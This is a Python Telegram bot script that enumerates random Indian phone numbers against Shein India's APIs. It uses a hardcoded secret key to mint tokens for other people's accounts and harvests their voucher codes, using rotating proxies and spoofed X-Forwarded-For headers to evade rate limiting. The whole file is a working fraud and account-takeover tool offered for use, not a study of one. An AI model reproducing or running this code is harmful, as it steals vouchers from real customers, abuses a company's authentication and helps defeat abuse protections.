import telebot
import requests
import random
import json
import os
import time
import threading
from datetime import datetime
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

# ======================================
# ANSI COLORS FOR BEAUTIFUL OUTPUT
# ======================================
class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

# ======================================
# CONFIGURATION
# ======================================
PROXY_FILE = "proxies.txt"
OUTPUT_FILE = "vouchers.txt"
SECRET_KEY = "3LFcKwBTXcsMzO5LaUbNYoyMSpt7M3RP5dW9ifWffzg"

# Browser Mimic Headers
BROWSER_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Linux; Android 10; RMX2030 Build/QKQ1.200209.002) AppleKit/537.36 (KHTML, like Gecko) Chrome/142 Mobile Safari/537.36",
    "Accept": "application/json",
    "Referer": "https://www.sheinindia.in/",
    "X-TENANT-ID": "SHEIN",
}

def now():
    return datetime.now().strftime("%I:%M:%S %p")

def load_proxies():
    if not os.path.exists(PROXY_FILE):
        return []
    with open(PROXY_FILE, "r") as f:
        proxies = [line.strip() for line in f if line.strip() and not line.startswith('#')]
    return proxies

ALL_PROXIES = load_proxies()

def get_formatted_proxy(proxy_str):
    if not proxy_str:
        return None
    return {
        "http": f"http://{proxy_str}",
        "https": f"http://{proxy_str}",
    }

def save_voucher_data(data):
    data["timestamp"] = time.strftime("%Y-%m-%d %H:%M:%S")
    with open(OUTPUT_FILE, "a", encoding="utf-8") as f:
        f.write(json.dumps(data) + "\n")
    print(f"[{now()}] {Colors.CYAN}💾 Voucher saved to {OUTPUT_FILE}{Colors.RESET}")

# ======================================
# AUTO MODE GLOBALS (UPDATED PREFIXES)
# ======================================
auto_running = False
target_chat_id = None

# ==================== TUMHARI CUSTOM PREFIXES ====================
prefixes = ['99','98','97','96','93','90','88','89','92','70','79','78','63','62']
# ================================================================

def generate_random_phone():
    prefix = random.choice(prefixes)          # ← sirf yeh prefixes se random
    suffix = ''.join(random.choices('0123456789', k=8))
    return prefix + suffix

def auto_checker():
    global auto_running, target_chat_id
    print(f"[{now()}] {Colors.CYAN}🚀 AUTO CHECKER STARTED! (Sirf tumhare prefixes: 99,98,97,96,93,90,88,89,87,70,79,78,63,62){Colors.RESET}")
    
    while auto_running:
        phone = generate_random_phone()
        code, amount = fetcher.get_voucher(phone)
        
        if code and target_chat_id:
            try:
                bot.send_message(target_chat_id, f"""🎉🎉 VOUCHER FOUND! 🎉🎉
📱 Phone: {phone}
🔑 Code: {code}
💰 Amount: ₹{amount}
⏰ Time: {now()}
✅ Saved in vouchers.txt""")
            except:
                pass
        
        time.sleep(0.1)  # VERY FAST (0.1 bhi kar sakte ho agar chahiye)

# ======================================
# VOUCHER EXTRACTOR CLASS (Speed Optimized)
# ======================================
class SheinCliFetcher:
    def __init__(self):
        self.session = requests.Session()
        adapter = HTTPAdapter(max_retries=Retry(total=2, backoff_factor=0.3))
        self.session.mount("http://", adapter)
        self.session.mount("https://", adapter)
        self.session.headers.update(BROWSER_HEADERS)
        
        self.checked = 0
        self.registered = 0
        self.found = 0

    def get_random_ip(self):
        first_octet = random.choice([x for x in range(1, 255) if x not in [10, 127, 172, 192]])
        return f"{first_octet}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"

    def extract_access_token(self, data):
        if not data: return None
        if isinstance(data, dict):
            for k in ["access_token", "accessToken"]:
                if k in data and data[k]: return data[k]
            if "data" in data and isinstance(data["data"], dict):
                for k in ["access_token", "accessToken"]:
                    if k in data["data"] and data["data"][k]: return data["data"][k]
        return None

    def get_client_token(self, proxy_dict):
        url = "https://api.services.sheinindia.in/uaas/jwt/token/client"
        headers = {
            'Client_type': 'Android/31',
            'Client_version': '1.0.10',
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-Forwarded-For': self.get_random_ip()
        }
        data = "grantType=client_credentials&clientName=trusted_client&clientSecret=secret"
        try:
            r = self.session.post(url, headers=headers, data=data, proxies=proxy_dict, timeout=15)
            return r.json() if r.status_code == 200 else None
        except: return None

    def check_shein_account(self, token, phone, proxy_dict):
        url = "https://api.services.sheinindia.in/uaas/accountCheck"
        headers = {
            'Authorization': f'Bearer {token}',
            'Requestid': 'account_check',
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-Forwarded-For': self.get_random_ip()
        }
        data = f"mobileNumber={phone}"
        try:
            r = self.session.post(url, headers=headers, data=data, proxies=proxy_dict, timeout=10)
            return r.json() if r.status_code == 200 else None
        except: return None

    def get_encrypted_id(self, phone, proxy_dict):
        tokdata = self.get_client_token(proxy_dict)
        if not tokdata: return None
        token = self.extract_access_token(tokdata)
        if not token: return None

        time.sleep(random.uniform(0.1, 0.3))
        data = self.check_shein_account(token, phone, proxy_dict)

        if data and isinstance(data, dict):
            if "data" in data and isinstance(data["data"], dict) and "encryptedId" in data["data"]:
                return data["data"]["encryptedId"]
            if "result" in data and isinstance(data["result"], dict) and "encryptedId" in data["result"]:
                return data["result"]["encryptedId"]
            if "encryptedId" in data:
                return data["encryptedId"]
        return None

    def get_creator_token(self, phone, enc, proxy_dict):
        url = "https://shein-creator-backend-151437891745.asia-south1.run.app/api/v1/auth/generate-token"
        payload = {
            "client_type": "Android/31",
            "client_version": "1.0.10",
            "gender": "male",
            "phone_number": phone,
            "secret_key": SECRET_KEY,
            "user_id": enc,
            "user_name": "CLI_User"
        }
        try:
            r = self.session.post(url, json=payload, proxies=proxy_dict, timeout=10)
            return self.extract_access_token(r.json()) if r.status_code == 200 else None
        except: return None

    def get_user_profile(self, token, proxy_dict):
        url = "https://shein-creator-backend-151437891745.asia-south1.run.app/api/v1/user"
        headers = {
            "Authorization": f"Bearer {token}",
            "X-Forwarded-For": self.get_random_ip()
        }
        try:
            r = self.session.get(url, headers=headers, proxies=proxy_dict, timeout=10)
            return r.json() if r.status_code == 200 else None
        except: return None

    def extract_voucher_from_profile(self, profile_data):
        if not profile_data or not isinstance(profile_data, dict): 
            return None, None
        
        def search_json(node):
            if isinstance(node, dict):
                code = node.get("voucher_code") or node.get("voucherCode") or node.get("voucherId") or node.get("code")
                amount = node.get("voucher_amount") or node.get("voucherAmount") or node.get("amount") or node.get("discount")
                
                if code and len(str(code)) > 4:
                    return str(code), str(amount) if amount else "Unknown"

                for key, value in node.items():
                    if isinstance(value, (dict, list)):
                        c, a = search_json(value)
                        if c: return c, a
                    
            elif isinstance(node, list):
                for item in node:
                    if isinstance(item, (dict, list)):
                        c, a = search_json(item)
                        if c: return c, a
            return None, None

        return search_json(profile_data)

    def get_voucher(self, phone, use_proxy=True):
        self.checked += 1
        current_proxy_str = random.choice(ALL_PROXIES) if (ALL_PROXIES and use_proxy) else None
        proxy_dict = get_formatted_proxy(current_proxy_str)
        proxy_display = current_proxy_str.split('@')[-1] if current_proxy_str else "LOCAL"
        
        print(f"[{now()}] {Colors.BLUE}📱 CHECKING: {phone} | Via: {proxy_display[:20]}{Colors.RESET}")

        enc = self.get_encrypted_id(phone, proxy_dict)
        if not enc:
            print(f"[{now()}] {Colors.RED}❌ NOT REGISTERED: {phone}{Colors.RESET}")
            return None, None

        print(f"[{now()}] {Colors.GREEN}✅ REGISTERED: {phone}{Colors.RESET}")
        self.registered += 1

        tok = self.get_creator_token(phone, enc, proxy_dict)
        if not tok:
            print(f"[{now()}] {Colors.YELLOW}⚠️ TOKEN FAILED: {phone}{Colors.RESET}")
            return None, None

        prof = self.get_user_profile(tok, proxy_dict)
        if not prof:
            print(f"[{now()}] {Colors.YELLOW}⚠️ PROFILE FAILED: {phone}{Colors.RESET}")
            return None, None

        code, amount = self.extract_voucher_from_profile(prof)
        
        if code:
            print(f"\n[{now()}] {Colors.MAGENTA}{Colors.BOLD}🎉🎉 VOUCHER FOUND! 🎉🎉{Colors.RESET}")
            print(f"[{now()}] {Colors.MAGENTA}   Code: {code} | Amount: ₹{amount}{Colors.RESET}\n")
            self.found += 1
            save_voucher_data({"phone": phone, "code": code, "amount": amount, "type": "auto"})
            return code, amount
        else:
            print(f"[{now()}] {Colors.CYAN}ℹ️ NO VOUCHER: {phone}{Colors.RESET}")
            return None, None

# ======================================
# TELEGRAM BOT SETUP
# ======================================
BOT_TOKEN = os.getenv("BOT_TOKEN")  # ←←← YAHAN APNA TOKEN DAAL DO
bot = telebot.TeleBot(BOT_TOKEN)
fetcher = SheinCliFetcher()

# ======================================
# BOT COMMANDS
# ======================================
@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, """👋 Welcome bhai!

Commands:
 /auto  → Auto random check (sirf tumhare prefixes: 99,98,97,96,93,90,88,89,87,70,79,78,63,62)
 /stop  → Auto band karo
 /stats → Live stats dekho

Ab full lazy mode! 🔥""")

@bot.message_handler(commands=['auto'])
def start_auto(message):
    global auto_running, target_chat_id
    if auto_running:
        bot.reply_to(message, "✅ Auto already chal raha hai!")
        return
    target_chat_id = message.chat.id
    auto_running = True
    thread = threading.Thread(target=auto_checker, daemon=True)
    thread.start()
    bot.reply_to(message, "🚀 AUTO CHECKER START HO GAYA!\nSirf tumhare custom prefixes se random numbers ban rahe hain.\nVoucher mile to turant message aa jayega!\n/stop se band.")

@bot.message_handler(commands=['stop'])
def stop_auto(message):
    global auto_running
    if not auto_running:
        bot.reply_to(message, "❌ Auto chal nahi raha!")
        return
    auto_running = False
    bot.reply_to(message, "⏹️ AUTO CHECKER BAND HO GAYA!")

@bot.message_handler(commands=['stats'])
def show_stats(message):
    bot.reply_to(message, f"""📊 CURRENT STATS:
Checked     : {fetcher.checked}
Registered  : {fetcher.registered}
Vouchers    : {fetcher.found}
Prefixes    : 99,98,97,96,92,90,88,89,87,70,79,78,63,62
Speed       : Super Fast 🔥""")

@bot.message_handler(func=lambda message: True)
def handle_numbers(message):
    text = message.text.strip()
    numbers = [num.strip() for num in text.replace(',', ' ').replace('\n', ' ').split() if num.strip().isdigit() and len(num.strip()) == 10]
    
    if not numbers:
        bot.reply_to(message, "10-digit number bhejo (manual check ke liye).")
        return
    
    bot.reply_to(message, f"Manual check kar raha hoon {len(numbers)} numbers ka...")
    for phone in numbers:
        code, amount = fetcher.get_voucher(phone)
        if code:
            bot.send_message(message.chat.id, f"For {phone}:\n✅ Voucher found!\nCode: {code}\nAmount: ₹{amount}")
        else:
            bot.send_message(message.chat.id, f"For {phone}: ❌ No voucher.")
        time.sleep(0.5)

# ======================================
# START BOT
# ======================================
if __name__ == '__main__':
    print(f"[{now()}] {Colors.GREEN}Bot ready! /auto command se start kar do bhai 🔥 (Custom prefixes set ho gaye){Colors.RESET}")
    bot.polling()

